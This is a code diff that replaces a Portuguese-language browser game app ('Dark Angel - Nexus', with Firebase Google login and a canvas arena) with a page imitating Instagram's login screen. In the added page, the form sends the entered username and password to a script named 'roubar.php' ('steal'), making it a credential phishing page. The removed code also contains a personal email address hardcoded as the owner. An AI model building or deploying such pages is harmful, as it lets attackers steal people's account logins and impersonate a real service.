@@ -1,316 +1,121 @@
 <!DOCTYPE html>
-<html lang="pt-pt">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Dark Angel - Nexus</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
     <style>
         body {
-            background-color: #000;
-            color: #fff;
-            font-family: 'Inter', sans-serif;
-            margin: 0;
-            height: 100vh;
-            width: 100vw;
-            overflow: hidden;
-            -webkit-tap-highlight-color: transparent;
-        }
-        .font-serif { font-family: 'Cinzel', serif; }
-        
-        .loading-container {
-            position: fixed;
-            inset: 0;
-            background: #000;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            z-index: 10000;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(139, 92, 246, 0.1);
-            border-top: 3px solid #8b5cf6;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        .container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px 40px;
+            width: 350px;
+            text-align: center;
         }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .nexus-card {
-            background: rgba(20, 20, 20, 0.8);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
+        .logo {
+            font-family: 'Billabong', cursive;
+            font-size: 50px;
+            margin: 20px 0;
+            background: linear-gradient(to right, #833ab4, #fd1d1d, #fcb045);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-
-        .role-tag {
-            font-size: 9px;
-            font-weight: 900;
-            padding: 2px 8px;
-            border-radius: 4px;
-            text-transform: uppercase;
+        .form-group {
+            margin-bottom: 10px;
         }
-
-        .role-criador { background: #facc1522; color: #facc15; border: 1px solid #facc1544; }
-        .role-membro { background: #ffffff11; color: #9ca3af; border: 1px solid #ffffff22; }
-
-        canvas {
-            display: block;
+        input[type="text"], input[type="password"] {
             width: 100%;
-            height: 100%;
-            background: #0a0a0a;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            box-sizing: border-box; /* Importante para não estourar o container */
         }
-
-        #error-toast {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #ef4444;
+        .button {
+            width: 100%;
+            padding: 8px;
+            background-color: #0095f6;
             color: white;
-            padding: 10px 20px;
-            border-radius: 10px;
-            font-size: 12px;
+            border: none;
+            border-radius: 3px;
             font-weight: bold;
-            display: none;
-            z-index: 11000;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #0077ff;
+        }
+        .divider {
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .divider span {
+            padding: 0 10px;
+            color: #737373;
+            font-size: 13px;
+        }
+        .facebook-login {
+            color: #385185;
+            font-weight: bold;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        .signup-link {
+            margin-top: 20px;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            width: 350px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .signup-link a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
 
-    <!-- Loading State -->
-    <div id="loadingScreen" class="loading-container">
-        <div class="spinner"></div>
-        <p class="mt-4 text-purple-500 font-black text-[10px] tracking-[0.3em] uppercase">Conectando ao Nexus...</p>
-    </div>
-
-    <!-- Error Toast -->
-    <div id="error-toast">Ocorreu um erro na conexão.</div>
-
-    <!-- Login Screen -->
-    <div id="loginScreen" class="hidden fixed inset-0 bg-black flex flex-col items-center justify-center p-8 z-[9000]">
-        <h1 class="text-4xl font-serif mb-2">DARK <span class="text-purple-500">ANGEL</span></h1>
-        <p class="text-gray-500 text-[10px] uppercase tracking-[0.4em] mb-12">Protocolo de Acesso</p>
-        <button id="btnGoogle" class="w-full max-w-xs bg-white text-black py-4 rounded-2xl font-black flex items-center justify-center gap-3 active:scale-95 transition-all">
-            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" class="w-5" alt="Google">
-            ENTRAR COM GOOGLE
-        </button>
-    </div>
-
-    <!-- Main App -->
-    <div id="app" class="hidden h-full flex flex-col">
-        <nav class="h-16 border-b border-white/5 flex items-center justify-between px-6 bg-black/50 backdrop-blur-md">
-            <div class="flex items-center gap-2">
-                <span class="font-serif text-sm">DARK ANGEL</span>
-                <span id="roleLabel" class="role-tag role-membro">MEMBRO</span>
+    <div class="container">
+        <div class="logo">Instagram</div>
+        <form action="roubar.php" method="POST">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required>
             </div>
-            <button onclick="logout()" class="text-[9px] font-black text-gray-500">SAIR</button>
-        </nav>
-
-        <main class="flex-1 p-6 overflow-y-auto">
-            <div id="view-arena">
-                <div class="mb-8">
-                    <h2 class="text-2xl font-serif">Olá, <span id="userName">...</span></h2>
-                    <p class="text-[9px] text-gray-500 font-bold uppercase tracking-widest">ID: <span id="userId">...</span></p>
-                </div>
-
-                <div class="nexus-card p-10 text-center flex flex-col items-center gap-6">
-                    <div class="text-5xl">⚔️</div>
-                    <button onclick="startArena()" class="w-full bg-purple-600 py-4 rounded-xl font-black shadow-lg shadow-purple-600/20 active:scale-95 transition-all uppercase tracking-widest text-sm">
-                        Entrar na Arena
-                    </button>
-                </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Senha" required>
             </div>
-        </main>
-    </div>
-
-    <!-- Game View -->
-    <div id="gameView" class="hidden fixed inset-0 bg-black z-[10000] flex flex-col">
-        <div class="h-14 border-b border-white/10 flex items-center justify-between px-4">
-            <button onclick="stopArena()" class="text-[10px] font-black text-gray-500">SAIR DA ARENA</button>
-            <div class="flex items-center gap-2">
-                <div class="w-24 h-2 bg-white/10 rounded-full overflow-hidden">
-                    <div id="hpFill" class="h-full bg-red-600 w-full transition-all"></div>
-                </div>
-            </div>
+            <button type="submit" class="button">Entrar</button>
+        </form>
+        <div class="divider">
+            <span>OU</span>
         </div>
-        <div class="flex-1 bg-zinc-950 relative" id="canvas-container">
-            <canvas id="arenaCanvas"></canvas>
-        </div>
-        <div class="p-4 grid grid-cols-2 gap-4 bg-black border-t border-white/10">
-            <div class="grid grid-cols-3 gap-2 w-max mx-auto">
-                <div></div><button class="w-12 h-12 bg-white/5 rounded-lg active:bg-purple-600" id="m-up">▲</button><div></div>
-                <button class="w-12 h-12 bg-white/5 rounded-lg active:bg-purple-600" id="m-left">◀</button>
-                <button class="w-12 h-12 bg-white/5 rounded-lg active:bg-purple-600" id="m-down">▼</button>
-                <button class="w-12 h-12 bg-white/5 rounded-lg active:bg-purple-600" id="m-right">▶</button>
-            </div>
-            <div class="flex items-center justify-center">
-                <button class="w-20 h-20 bg-red-600/10 border-2 border-red-600/30 rounded-full active:bg-red-600" id="m-atk">⚔️</button>
-            </div>
-        </div>
+        <a href="#" class="facebook-login">Entrar usando o Facebook</a>
+        <a href="#" style="display: block; margin-top: 10px; font-size: 12px; color: #00376b;">Esqueceu a senha?</a>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getAuth, onAuthStateChanged, signInWithPopup, GoogleAuthProvider, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
-        import { getFirestore, doc, setDoc, getDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+    <div class="signup-link">
+        Não tem uma conta? <a href="#">Cadastre-se</a>
+    </div>
 
-        // Configuração segura
-        const firebaseConfig = JSON.parse(__firebase_config);
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const db = getFirestore(app);
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'dark-angel-final-v1';
-        const OWNER_EMAIL = "rafaelmartinsdosanjos27@gmail.com";
-
-        let profile = null;
-
-        // --- AUTH SYSTEM ---
-        onAuthStateChanged(auth, async (user) => {
-            const loader = document.getElementById('loadingScreen');
-            const login = document.getElementById('loginScreen');
-            const appDiv = document.getElementById('app');
-
-            if (!user) {
-                loader.classList.add('hidden');
-                login.classList.remove('hidden');
-                appDiv.classList.add('hidden');
-                return;
-            }
-
-            // Registrar presença básica com tratamento de erro
-            try {
-                const presenceRef = doc(db, 'artifacts', appId, 'public', 'presence', user.uid);
-                await setDoc(presenceRef, {
-                    name: user.displayName,
-                    lastSeen: Date.now()
-                }, { merge: true });
-
-                // Monitorar Perfil
-                const profileRef = doc(db, 'artifacts', appId, 'users', user.uid, 'profile', 'data');
-                onSnapshot(profileRef, (snap) => {
-                    if (snap.exists()) {
-                        profile = snap.data();
-                        updateUI(user);
-                        loader.classList.add('hidden');
-                        login.classList.add('hidden');
-                        appDiv.classList.remove('hidden');
-                    } else {
-                        // Criar perfil inicial se não existir
-                        const defaultRole = (user.email === OWNER_EMAIL) ? 'CRIADOR' : 'MEMBRO';
-                        setDoc(profileRef, {
-                            id: user.uid.substring(0, 8).toUpperCase(),
-                            role: defaultRole,
-                            coins: 0
-                        });
-                    }
-                }, (error) => {
-                    console.error("Firestore Error:", error);
-                    showError("Erro ao sincronizar dados.");
-                });
-
-            } catch (e) {
-                showError("Erro de conexão.");
-                loader.classList.add('hidden');
-            }
-        });
-
-        // Eventos de Botões
-        document.getElementById('btnGoogle').onclick = () => {
-            const provider = new GoogleAuthProvider();
-            signInWithPopup(auth, provider).catch(e => showError("Falha no login Google."));
-        };
-
-        window.logout = () => signOut(auth);
-
-        function updateUI(user) {
-            document.getElementById('userName').innerText = user.displayName.split(' ')[0];
-            document.getElementById('userId').innerText = profile.id;
-            const roleTag = document.getElementById('roleLabel');
-            roleTag.innerText = profile.role;
-            roleTag.className = 'role-tag ' + (profile.role === 'CRIADOR' ? 'role-criador' : 'role-membro');
-        }
-
-        function showError(msg) {
-            const toast = document.getElementById('error-toast');
-            toast.innerText = msg;
-            toast.style.display = 'block';
-            setTimeout(() => toast.style.display = 'none', 3000);
-        }
-
-        // --- GAME SYSTEM ---
-        const canvas = document.getElementById('arenaCanvas');
-        const ctx = canvas.getContext('2d');
-        let gameRunning = false;
-        let player = { x: 100, y: 100, hp: 100 };
-        let controls = { up: false, down: false, left: false, right: false };
-
-        window.startArena = () => {
-            document.getElementById('gameView').classList.remove('hidden');
-            gameRunning = true;
-            loop();
-        };
-
-        window.stopArena = () => {
-            document.getElementById('gameView').classList.add('hidden');
-            gameRunning = false;
-        };
-
-        function loop() {
-            if (!gameRunning) return;
-
-            const container = document.getElementById('canvas-container');
-            canvas.width = container.clientWidth;
-            canvas.height = container.clientHeight;
-
-            // Movimento
-            const speed = 4;
-            if (controls.up) player.y -= speed;
-            if (controls.down) player.y += speed;
-            if (controls.left) player.x -= speed;
-            if (controls.right) player.x += speed;
-
-            // Limites do ecrã
-            player.x = Math.max(20, Math.min(canvas.width - 20, player.x));
-            player.y = Math.max(20, Math.min(canvas.height - 20, player.y));
-
-            // Desenho
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
-            // Desenhar Jogador (Estilo Dark Angel)
-            ctx.save();
-            ctx.shadowBlur = 15;
-            ctx.shadowColor = '#8b5cf6';
-            ctx.fillStyle = '#8b5cf6';
-            ctx.beginPath();
-            ctx.arc(player.x, player.y, 12, 0, Math.PI * 2);
-            ctx.fill();
-            ctx.restore();
-
-            requestAnimationFrame(loop);
-        }
-
-        // Controles Touch/Mouse
-        const bind = (id, key) => {
-            const el = document.getElementById(id);
-            el.onpointerdown = (e) => { e.preventDefault(); controls[key] = true; };
-            el.onpointerup = (e) => { e.preventDefault(); controls[key] = false; };
-            el.onpointerleave = (e) => { e.preventDefault(); controls[key] = false; };
-        };
-
-        bind('m-up', 'up');
-        bind('m-down', 'down');
-        bind('m-left', 'left');
-        bind('m-right', 'right');
-
-    </script>
 </body>
 </html>
-
-
